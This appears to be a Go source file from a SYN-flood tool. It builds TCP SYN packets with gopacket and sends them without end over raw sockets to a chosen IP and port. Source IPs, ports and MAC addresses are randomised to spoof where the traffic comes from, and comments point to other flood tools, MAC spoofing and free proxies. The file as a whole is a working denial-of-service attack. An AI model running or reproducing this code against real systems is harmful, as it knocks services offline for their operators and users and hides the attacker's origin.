package raw

import (
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/schollz/progressbar/v3"
	"golang.org/x/net/ipv4"
	"math/rand"
	"net"
	"time"
)

func init() {
	// initialize global pseudo random generator
	rand.Seed(time.Now().Unix())
}

// StartFlooding does the heavy lifting, starts the flood
func StartFlooding(dstIpStr string, dstPort, payloadLength int) error {
	var (
		ipHeader   *ipv4.Header
		packetConn net.PacketConn
		rawConn    *ipv4.RawConn
		err        error
	)

	description := fmt.Sprintf("Flood is in progress on %s:%d with payload length %d", dstIpStr, dstPort, payloadLength)
	bar := progressbar.DefaultBytes(-1, description)

	payload := getRandomPayload(payloadLength)
	srcIps := getIps()
	srcPorts := getPorts()
	macAddrs := getMacAddrs()

	for {
		// !!! https://www.devdungeon.com/content/packet-capture-injection-and-analysis-gopacket
		// https://www.programmersought.com/article/74831586115/
		// https://github.com/rootVIII/gosynflood
		// https://golangexample.com/repeatedly-send-crafted-tcp-syn-packets-with-raw-sockets/
		// https://github.com/kdar/gorawtcpsyn/blob/master/main.go
		// https://pkg.go.dev/github.com/google/gopacket
		// https://github.com/david415/HoneyBadger/blob/021246788e58cedf88dee75ac5dbf7ae60e12514/packetSendTest.go
		// mac spoofing -> https://github.com/google/gopacket/issues/153
		// free proxies -> https://www.sslproxies.org/

		tcpPacket := buildTcpPacket(srcPorts[rand.Intn(len(srcPorts))], dstPort)
		ipPacket := buildIpPacket(srcIps[rand.Intn(len(srcIps))], dstIpStr)
		if err = tcpPacket.SetNetworkLayerForChecksum(ipPacket); err != nil {
			return err
		}

		// Serialize.  Note:  we only serialize the TCP layer, because the
		// socket we get with net.ListenPacket wraps our data in IPv4 packets
		// already.  We do still need the IP layer to compute checksums
		// correctly, though.
		ipHeaderBuf := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}

		if err = ipPacket.SerializeTo(ipHeaderBuf, opts); err != nil {
			return err
		}

		if ipHeader, err = ipv4.ParseHeader(ipHeaderBuf.Bytes()); err != nil {
			return err
		}

		ethernetLayer := buildEthernetPacket(macAddrs[rand.Intn(len(macAddrs))], macAddrs[rand.Intn(len(macAddrs))])
		tcpPayloadBuf := gopacket.NewSerializeBuffer()
		pyl := gopacket.Payload(payload)

		if err = gopacket.SerializeLayers(tcpPayloadBuf, opts, ethernetLayer, tcpPacket, pyl); err != nil {
			return err
		}

		// XXX send packet
		if packetConn, err = net.ListenPacket("ip4:tcp", "0.0.0.0"); err != nil {
			return err
		}

		if rawConn, err = ipv4.NewRawConn(packetConn); err != nil {
			return err
		}

		if err = rawConn.WriteTo(ipHeader, tcpPayloadBuf.Bytes(), nil); err != nil {
			return err
		}

		if err = bar.Add(payloadLength); err != nil {
			return err
		}
	}
}

// buildIpPacket generates a layers.IPv4 and returns it with source IP address and destination IP address
func buildIpPacket(srcIpStr, dstIpStr string) *layers.IPv4 {
	return &layers.IPv4{
		SrcIP: net.ParseIP(srcIpStr).To4(),
		DstIP: net.ParseIP(dstIpStr).To4(),
		//Version: 4,
		//TTL: 64,
		Protocol: layers.IPProtocolTCP,
	}
}

// buildTcpPacket generates a layers.TCP and returns it with source port and destination port
func buildTcpPacket(srcPort, dstPort int) *layers.TCP {
	return &layers.TCP{
		SrcPort: layers.TCPPort(srcPort),
		DstPort: layers.TCPPort(dstPort),
		//Window:  1505,
		Window: 14600,
		// Urgent:  0,
		//Seq:     11050,
		Seq: 1105024978,
		// Ack:     0,
		SYN: true,
		ACK: false,
	}
}

// buildEthernetPacket generates an layers.Ethernet and returns it with source MAC address and destination MAC address
func buildEthernetPacket(srcMac, dstMac []byte) *layers.Ethernet {
	return &layers.Ethernet{
		SrcMAC: net.HardwareAddr{srcMac[0], srcMac[1], srcMac[2], srcMac[3], srcMac[4], srcMac[5]},
		DstMAC: net.HardwareAddr{dstMac[0], dstMac[1], dstMac[2], dstMac[3], dstMac[4], dstMac[5]},
	}
}
